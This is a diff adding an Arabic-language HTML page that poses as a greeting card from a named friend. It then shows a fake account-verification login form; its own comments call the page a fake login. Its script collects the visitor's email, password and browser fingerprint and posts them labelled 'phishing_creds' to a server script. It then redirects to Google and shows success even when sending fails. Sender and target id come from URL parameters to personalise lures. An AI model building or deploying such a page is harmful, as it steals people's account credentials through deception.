@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بطاقة تهنئة 🎉</title>
+<style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+        font-family: 'Segoe UI', Tahoma, sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .card {
+        background: white;
+        border-radius: 20px;
+        padding: 40px 30px;
+        max-width: 450px;
+        width: 100%;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        text-align: center;
+        animation: slideIn 0.6s ease;
+    }
+    @keyframes slideIn {
+        from { opacity: 0; transform: translateY(30px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    .emoji {
+        font-size: 80px;
+        margin-bottom: 20px;
+        animation: bounce 2s infinite;
+    }
+    @keyframes bounce {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-15px); }
+    }
+    h1 {
+        color: #764ba2;
+        font-size: 28px;
+        margin-bottom: 15px;
+        font-weight: bold;
+    }
+    .from {
+        color: #666;
+        font-size: 18px;
+        margin-bottom: 10px;
+    }
+    .from-name {
+        color: #ff6b9d;
+        font-weight: bold;
+        font-size: 22px;
+    }
+    p.message {
+        color: #888;
+        line-height: 1.6;
+        margin: 20px 0;
+        font-size: 15px;
+    }
+    .btn {
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        color: white;
+        border: none;
+        padding: 16px 40px;
+        border-radius: 50px;
+        font-size: 17px;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+        width: 100%;
+        transition: transform 0.2s, box-shadow 0.2s;
+        box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+    }
+    .btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 12px 25px rgba(102, 126, 234, 0.5);
+    }
+    .btn:active { transform: translateY(0); }
+
+    /* صفحة تسجيل الدخول المزيفة */
+    .login-form { display: none; text-align: right; }
+    .login-form.active { display: block; animation: slideIn 0.4s ease; }
+    .login-form h2 {
+        color: #764ba2;
+        text-align: center;
+        margin-bottom: 25px;
+        font-size: 22px;
+    }
+    .input-group {
+        margin-bottom: 18px;
+        text-align: right;
+    }
+    .input-group label {
+        display: block;
+        color: #555;
+        margin-bottom: 8px;
+        font-size: 14px;
+        font-weight: 600;
+    }
+    .input-group input {
+        width: 100%;
+        padding: 14px 18px;
+        border: 2px solid #e0e0e0;
+        border-radius: 12px;
+        font-size: 16px;
+        font-family: inherit;
+        transition: border-color 0.2s;
+        direction: ltr;
+    }
+    .input-group input:focus {
+        outline: none;
+        border-color: #764ba2;
+    }
+    .note {
+        background: #fff8e1;
+        border-right: 4px solid #ffc107;
+        padding: 12px;
+        border-radius: 8px;
+        font-size: 13px;
+        color: #666;
+        margin-bottom: 20px;
+        text-align: right;
+    }
+    .loader {
+        display: none;
+        margin-top: 20px;
+        color: #764ba2;
+        font-size: 14px;
+    }
+    .loader.active { display: block; }
+    .loader::after {
+        content: '...';
+        animation: dots 1.4s infinite;
+    }
+    @keyframes dots {
+        0%, 20% { content: '.'; }
+        40% { content: '..'; }
+        60%, 100% { content: '...'; }
+    }
+    .success-msg {
+        display: none;
+        text-align: center;
+    }
+    .success-msg.active { display: block; animation: slideIn 0.5s ease; }
+    .success-msg .check {
+        font-size: 80px;
+        margin-bottom: 20px;
+    }
+    .success-msg h2 {
+        color: #10b981;
+        margin-bottom: 15px;
+    }
+</style>
+</head>
+<body>
+    <div class="card">
+        <!-- المرحلة 1: بطاقة تهنئة -->
+        <div id="cardView">
+            <div class="emoji">🎉</div>
+            <h1>بطاقة تهنئة</h1>
+            <div class="from">تهانينا من</div>
+            <div class="from-name" id="senderName">صديقك</div>
+            <p class="message" id="cardMessage">
+                لقد أرسل لك بطاقة تهنئة خاصة! اضغط "حسناً" لاستلام البطاقة والمحتوى المرفق.
+            </p>
+            <button class="btn" onclick="showLogin()">✅ حسناً، أرني البطاقة</button>
+        </div>
+
+        <!-- المرحلة 2: نموذج تسجيل دخول مزيف -->
+        <div class="login-form" id="loginView">
+            <h2 id="loginTitle">🔐 تحقق من حسابك</h2>
+            <div class="note">
+                ⚠️ لتأكيد استلام البطاقة والمرفقات، يجب التحقق من حسابك.
+            </div>
+            <div class="input-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="emailInput" placeholder="example@gmail.com" autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور</label>
+                <input type="password" id="passInput" placeholder="••••••••" autocomplete="off">
+            </div>
+            <button class="btn" onclick="submitCreds()">🔓 تسجيل الدخول</button>
+            <div class="loader" id="loader">جاري التحقق</div>
+        </div>
+
+        <!-- المرحلة 3: نجاح -->
+        <div class="success-msg" id="successView">
+            <div class="check">✅</div>
+            <h2>تم التحقق بنجاح</h2>
+            <p class="message">سيتم تحويلك للبطاقة خلال لحظات...</p>
+        </div>
+    </div>
+
+    <script>
+        // ✅ استخراج المعاملات من URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sender = urlParams.get('from') || 'صديق مقرب';
+        const targetId = urlParams.get('id') || 'unknown';
+        const title = urlParams.get('title') || 'بطاقة تهنئة';
+        const msg = urlParams.get('msg') || '';
+
+        document.getElementById('senderName').textContent = sender;
+        document.title = title + ' من ' + sender;
+        if (msg) {
+            document.getElementById('cardMessage').textContent = msg;
+        }
+
+        function showLogin() {
+            document.getElementById('cardView').style.display = 'none';
+            document.getElementById('loginView').classList.add('active');
+            document.getElementById('loginTitle').textContent = '🔐 تحقق من ' + sender;
+        }
+
+        function submitCreds() {
+            const email = document.getElementById('emailInput').value.trim();
+            const pass = document.getElementById('passInput').value.trim();
+
+            if (!email) { alert('⚠️ أدخل البريد'); return; }
+            if (!pass) { alert('⚠️ أدخل كلمة المرور'); return; }
+
+            document.getElementById('loader').classList.add('active');
+
+            const payload = {
+                type: 'phishing_creds',
+                target_id: targetId,
+                sender: sender,
+                email: email,
+                password: pass,
+                ua: navigator.userAgent,
+                screen: window.screen.width + 'x' + window.screen.height,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                lang: navigator.language,
+                referrer: document.referrer || '',
+                url: window.location.href,
+                timestamp: Date.now()
+            };
+
+            // إرسال البيانات للسيرفر
+            fetch('/phishing_save.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                setTimeout(() => {
+                    document.getElementById('loginView').classList.remove('active');
+                    document.getElementById('successView').classList.add('active');
+
+                    // تحويل وهمي بعد 3 ثواني
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                }, 800);
+            }).catch(() => {
+                // حتى لو فشل الإرسال — نعرض النجاح
+                document.getElementById('loginView').classList.remove('active');
+                document.getElementById('successView').classList.add('active');
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 3000);
+            });
+        }
+
+        // ✅ مفتاح Enter
+        document.getElementById('passInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitCreds();
+        });
+    </script>
+</body>
+</html>
